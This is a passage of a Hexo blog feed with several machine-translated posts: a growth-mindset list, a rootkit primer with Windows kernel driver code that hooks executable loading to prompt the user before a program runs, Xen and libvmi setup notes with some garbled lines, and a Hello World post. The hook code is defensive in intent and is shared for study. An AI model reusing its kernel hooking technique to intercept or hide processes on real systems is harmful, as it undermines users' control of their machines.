id="Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking"><a href="#Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking" class="headerlink" title="Fourth:Change the way you speak, that is, change your way of thinking."></a>Fourth:Change the way you speak, that is, change your way of thinking.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1. <span class="string">"I do not understand what?"</span></div><div class="line"></div><div class="line"><span class="string">"I made a mistake."</span> Become <span class="string">"this mistake made me learn something."</span></div><div class="line"></div><div class="line"><span class="string">"It's too hard."</span> Become <span class="string">"I may need more effort."</span></div><div class="line"></div><div class="line">4. <span class="string">"Is it really my best thing?"</span></div><div class="line"></div><div class="line"><span class="string">"I can only do that."</span> <span class="string">"I can try again."</span></div><div class="line"></div><div class="line"><span class="string">"I can never be as clever as he is."</span> Become <span class="string">"I should learn from him."</span></div><div class="line"></div><div class="line"><span class="string">"I'm not too good at this."</span> Become <span class="string">"I'm improving."</span></div><div class="line"></div><div class="line"><span class="string">"I gave up."</span> <span class="string">"I'd better try other ways."</span></div></pre></td></tr></table></figure><h3 id="Fifth；Only-in-the-case-of-despair-we-will-choose-to-give-up"><a href="#Fifth；Only-in-the-case-of-despair-we-will-choose-to-give-up" class="headerlink" title="Fifth；Only in the case of despair, we will choose to give up"></a>Fifth；Only in the case of despair, we will choose to give up</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">People who have fixed thinking are more likely to have despair <span class="keyword">in</span> their failure, so they are more likely to choose to give up.</div><div class="line"></div><div class="line">People who have grown mind think of life as a continuous process, every failure as a stepping stone, will not give up, so they are more likely to be successful.</div><div class="line"></div><div class="line">Know there is a question and answer is very exciting,</div><div class="line"></div><div class="line">Asked, <span class="string">"how to get out of the haze of life?"</span></div><div class="line"></div><div class="line">Answer, <span class="string">"take a few more steps."</span></div></pre></td></tr></table></figure><p>More info: <a href="http://mp.weixin.qq.com/s?__biz=MjM5Mzk0OTI2MA==&amp;mid=2650571632&amp;idx=1&amp;sn=53ea9cae463779b63d8241248778450b&amp;chksm=be87105389f0994599d4a697a33a4c2d8f5de460357bf793a18fa8f1a60bc8dab65dc7100e30&amp;mpshare=1&amp;scene=23&amp;srcid=0919NB7BbDvelTwRARwTFShx#rd" target="_blank" rel="external">crazy reading</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;What-is-the-most-deadly-gap&quot;&gt;&lt;a href=&quot;#What-is-the-most-deadly-gap&quot; class=&quot;headerlink&quot; title=&quot;What is the most deadly gap?&quot;&gt;&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pocess</title>
    <link href="http://yoursite.com/2017/09/18/new5/"/>
    <id>http://yoursite.com/2017/09/18/new5/</id>
    <published>2017-09-18T10:59:07.781Z</published>
    <updated>2017-09-18T10:59:07.783Z</updated>
    
    <content type="html"><![CDATA[<p>What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function is<br>In the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and wood<br>Horse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letter<br>The purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,<br>So that our system more robust, give full play to the positive application of this technology.</p><h2 id="Process-monitoring"><a href="#Process-monitoring" class="headerlink" title="Process monitoring"></a>Process monitoring</h2><h3 id="Create-a-new-drive"><a href="#Create-a-new-drive" class="headerlink" title="Create a new drive"></a>Create a new drive</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">ULONG __stdcall check(PULONG arg)//获得指向服务参数指针</div><div class="line">&#123;</div><div class="line"></div><div class="line">  HANDLE hand=0;PFILE_OBJECT file=0;</div><div class="line"></div><div class="line">  POBJECT_HANDLE_INFORMATION info=0;ULONG a;char*buff;</div><div class="line">  ANSI_STRING str; LARGE_INTEGER li;li.QuadPart=-10000;</div><div class="line"></div><div class="line"><span class="keyword">if</span>((arg[4]&amp;0xf0)==0)<span class="built_in">return</span> 1;//检测标志</div><div class="line"><span class="keyword">if</span>((arg[5]&amp;0x01000000)==0)<span class="built_in">return</span> 1;//检测属性</div><div class="line"></div><div class="line"></div><div class="line">//通过文件句柄获得文件名</div><div class="line">hand=(HANDLE)arg[6];//获得执行文件句柄</div><div class="line"></div><div class="line">ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;file,info);//&amp;file获得对象体指针</div><div class="line"><span class="keyword">if</span>(!file)<span class="built_in">return</span> 1;</div><div class="line"></div><div class="line">RtlUnicodeStringToAnsiString(&amp;str,&amp;file-&gt;FileName,1);</div><div class="line"></div><div class="line">a=str.Length;buff=str.Buffer;</div><div class="line"></div><div class="line"><span class="keyword">while</span>(1)//通过循环判断是不是有<span class="string">". "</span>标志</div><div class="line">&#123;</div><div class="line">  </div><div class="line"><span class="keyword">if</span>(buff[a]==<span class="string">'.'</span>)</div><div class="line">&#123;a++;<span class="built_in">break</span>;&#125;</div><div class="line"></div><div class="line">  a--;</div><div class="line"></div><div class="line">&#125;</div><div class="line">ObDereferenceObject(file);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span>(_stricmp(&amp;buff[a],<span class="string">"exe"</span>))&#123;RtlFreeAnsiString(&amp;str);<span class="built_in">return</span> 1;&#125;//判断是否为可执行文件</div><div class="line"></div><div class="line"></div><div class="line"> </div><div class="line">KeWaitForSingleObject(&amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态</div><div class="line"></div><div class="line"></div><div class="line">strcpy(&amp;output[8],buff);//将string复制进buff</div><div class="line">RtlFreeAnsiString(&amp;str);</div><div class="line"></div><div class="line">a=1;//用户的决定通过a的制来反映</div><div class="line">memmove(&amp;output[0],&amp;a,4);</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line">KeDelayExecutionThread(KernelMode,0,&amp;li);//在一个固定时间间隔内当前线程处于等待状态</div><div class="line">memmove(&amp;a,&amp;output[0],4);</div><div class="line"><span class="keyword">if</span>(!a)<span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line">memmove(&amp;a,&amp;output[4],4);</div><div class="line"></div><div class="line">KeSetEvent(&amp;event,0,0);</div><div class="line"></div><div class="line"><span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//保存执行文件上下文，调用check()函数</div><div class="line">_declspec(naked) Proxy()</div><div class="line">&#123;</div><div class="line"></div><div class="line">_asm&#123;</div><div class="line"></div><div class="line">pushfd</div><div class="line">pushad</div><div class="line">mov ebx,esp</div><div class="line"></div><div class="line">add ebx,40</div><div class="line">push ebx</div><div class="line"></div><div class="line">call check</div><div class="line"></div><div class="line">cmp eax,1//由check()的返回值判断是否让可执行文件继续执行</div><div class="line">jne block</div><div class="line"></div><div class="line"></div><div class="line">popad</div><div class="line">popfd</div><div class="line">jmp RealCallee//通过，调用ntcreatesection</div><div class="line"></div><div class="line"></div><div class="line">block:popad</div><div class="line">mov ebx, dword ptr[esp+8]</div><div class="line"></div><div class="line">mov dword ptr[ebx],0</div><div class="line">mov eax,0xC0000022L//不让其通过，返回STATUS_ACCESS_DENIED</div><div class="line">popfd</div><div class="line">ret 32</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。</div><div class="line"> char*name=(char*)&amp;outputbuff[8];</div><div class="line"></div><div class="line">        <span class="keyword">for</span>(x=0;x&lt;stringcount;x++)</div><div class="line"></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(!stricmp(name,strings[x]))&#123;a=1;goto skip;&#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        strcpy(msgbuff, <span class="string">"Do you want to run "</span>);</div><div class="line">        strcat(msgbuff,&amp;outputbuff[8]);</div><div class="line"></div><div class="line">        </div><div class="line">        <span class="keyword">if</span>(IDYES==MessageBox(0, msgbuff,<span class="string">"WARNING"</span>,</div><div class="line">           MB_YESNO|MB_ICONQUESTION|0x00200000L))</div><div class="line"></div><div class="line">        &#123;a=1; strings[stringcount]=_strdup(name);stringcount++;&#125;</div><div class="line">        <span class="keyword">else</span> a=0;</div><div class="line">    </div><div class="line">        // write response to the buffer, and driver will get it</div><div class="line">        skip:memmove(&amp;outputbuff[4],&amp;a,4);</div><div class="line"></div><div class="line">        //让驱动继续</div><div class="line">        a=0;</div><div class="line">        memmove(&amp;outputbuff[0],&amp;a,4);</div><div class="line">&#125;&#125;</div></pre></td></tr></table></figure><p>More info: <a href="https://baike.baidu.com/item/rootkit/6356777?fr=aladdin" target="_blank" rel="external">Rootkit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Virtualization monitoring process</title>
    <link href="http://yoursite.com/2017/09/17/new%204/"/>
    <id>http://yoursite.com/2017/09/17/new 4/</id>
    <published>2017-09-17T09:03:02.957Z</published>
    <updated>2017-09-17T21:43:20.701Z</updated>
    
    <content type="html"><![CDATA[<p>With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit.</p><h2 id="Introduction-Doc"><a href="#Introduction-Doc" class="headerlink" title="Introduction Doc"></a>Introduction Doc</h2><h3 id="install-xen-on-the-ubuntu"><a href="#install-xen-on-the-ubuntu" class="headerlink" title="install xen on the ubuntu"></a>install xen on the ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install virt-manager</div><div class="line">$ sudo apt-get install xen-hypervisor-amd64</div><div class="line">$ sudo reboot</div><div class="line">$ sudo xl list(Check <span class="keyword">if</span> the installation is successful)</div></pre></td></tr></table></figure><p>Site of docu: <a href="https://xenserver.org/" target="_blank" rel="external">Xen</a></p><h3 id="The-virtual-machine-is-created-to-run"><a href="#The-virtual-machine-is-created-to-run" class="headerlink" title="The virtual machine is created to run"></a>The virtual machine is created to run</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update</div><div class="line">$ sudo apt-get -y install virt-manager qemu-system</div><div class="line">$ There is no need <span class="keyword">for</span> instructions here, as to download ubuntu system</div><div class="line">Attention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as follows</div><div class="line">Click on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, </div><div class="line">I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)</div><div class="line">The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The The</div><div class="line">installation. The The The The The The The The</div><div class="line">And <span class="keyword">then</span> <span class="built_in">type</span> the <span class="built_in">command</span> line $ sudo xl list on dom0, you can see xen monitor the two systems:</div></pre></td></tr></table></figure><p>More info: <a href="http://www.ubuntu.org.cn/index_kylin" target="_blank" rel="external">Ubuntu</a></p><h3 id="libvmi-variant-installation"><a href="#libvmi-variant-installation" class="headerlink" title="libvmi variant installation"></a>libvmi variant installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install libglib2.0-dev</div><div class="line">./autogen.sh</div><div class="line">If Error: could not find libtoolize or glibtoolize</div><div class="line">Solve: sudo apt-get install libtool</div><div class="line">2 ./autogen.sh</div><div class="line">  ./configure</div><div class="line">If missing xenstore</div><div class="line">Solve:sudo apt-get install libxen-dev... ...</div><div class="line">you just need to install whats the packge you need!</div><div class="line">sudo apt-get install check</div><div class="line">./autogen.sh</div><div class="line">./configure</div><div class="line"></div><div class="line">Last:View the files under libvmi-0.10.1 / example</div><div class="line">If you can find process-list、process-list.c、process-list.o,<span class="keyword">then</span> congratulation to you <span class="keyword">for</span> that you are successful!</div></pre></td></tr></table></figure><p>More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve for everyone!<br>More info: <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Formula: * p = p-pid;</div></pre></td></tr></table></figure><p>More info: According to the various versions of the operating system data structure Xie wrote the main function of the module and Makfile file<br>Formula: * p = p-pid;<br>Also perform a file to view the kernel data structure of the various defined macros as well as the operation<br>More info: <a href="http://blog.csdn.net/geekcome/article/details/6196044" target="_blank" rel="external">CSDN</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the beh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/09/13/hello-world/"/>
    <id>http://yoursite.com/2017/09/13/hello-world/</id>
    <published>2017-09-13T06:04:39.929Z</published>
    <updated>2017-09-13T06:04:39.929Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
